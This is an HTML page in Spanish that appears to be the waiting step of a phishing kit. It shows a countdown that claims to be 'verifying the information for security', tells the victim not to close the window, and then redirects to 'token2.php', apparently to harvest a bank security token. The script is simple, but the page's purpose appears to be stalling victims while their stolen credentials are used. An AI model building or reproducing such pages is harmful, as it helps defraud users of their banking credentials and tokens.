<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="cs.css">
</head>
<body class="body">
    

<div class="dc">
<img  src="logo.svg" alt="" width="120px">
</div>







<div class="pp">



<br><br>



    <center>
<img class="title" src="title.png" alt="">
      <div class="caja1">
        

 <br>

           <form action="" method="post" class="hh"> 






            <a class="txt3" id="CuentaAtras">Espera...  </a>


            <script language="JavaScript">
            
               /* Determinamos el tiempo total en segundos */
               var totalTiempo=20;
               
               var url="token2.php";
            
               function updateReloj()
               {
                   document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" Segundos.<br><br>Estamos verificando la información por seguridad no cierre esta ventana y no apague su dispositívo. <br> ";
            
                   if(totalTiempo==0)
                   {
                       window.location=url;
                   }else{
                       /* Restamos un segundo al tiempo restante */
                       totalTiempo-=1;
                       /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
                       setTimeout("updateReloj()",1000);
                   }
               }
             window.onload=updateReloj;
            
               </script>
           <br><br> 

  <img src="CARGANDO.gif" alt="" style="width: 80px;">




<br> <br><br>  


<img src="mogos.png" alt="" style="width: 300px;">



           <br><br><br><br><br> 



            </form>



      </div>
    </center>











































</div>

















</body>
</html>